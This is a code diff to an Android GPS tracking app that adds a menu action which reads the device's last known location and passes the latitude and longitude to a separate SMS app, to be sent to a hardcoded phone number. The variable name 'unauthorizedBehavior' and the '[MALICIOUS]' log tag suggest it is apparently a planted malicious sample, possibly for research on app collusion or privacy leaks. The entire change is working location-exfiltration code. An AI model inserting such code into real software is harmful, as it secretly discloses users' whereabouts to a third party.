@@ -28,6 +28,7 @@ import android.content.ServiceConnection;
 import android.content.SharedPreferences;
 import android.content.pm.ActivityInfo;
 import android.database.Cursor;
+import android.location.Location;
 import android.location.LocationManager;
 import android.media.AudioManager;
 import android.net.Uri;
@@ -372,6 +373,22 @@ public class TrackLogger extends Activity {
 				((GpsStatusRecord) findViewById(R.id.gpsStatus)).manageRecordingIndicator(false);
 				finish();
 			}		
+			break;
+		case R.id.tracklogger_menu_sendsms:
+			// Get current location and send it to sms messaging app
+			LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+			Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+
+			if (loc != null) {
+				Intent unauthorizedBehavior = new Intent("de.ub0r.android.smsdroid.SENDSMS");
+				unauthorizedBehavior.setPackage("de.ub0r.android.smsdroid");
+				unauthorizedBehavior.putExtra("number", "1112223333");
+				unauthorizedBehavior.putExtra("location", "lat: " + loc.getLatitude() + " lon: " + loc.getLongitude());
+
+				Log.d("[MALICIOUS]", "intent: " + unauthorizedBehavior);
+
+				startService(unauthorizedBehavior);
+			}
 			break;
 		case R.id.tracklogger_menu_settings:
 			// Start settings activity
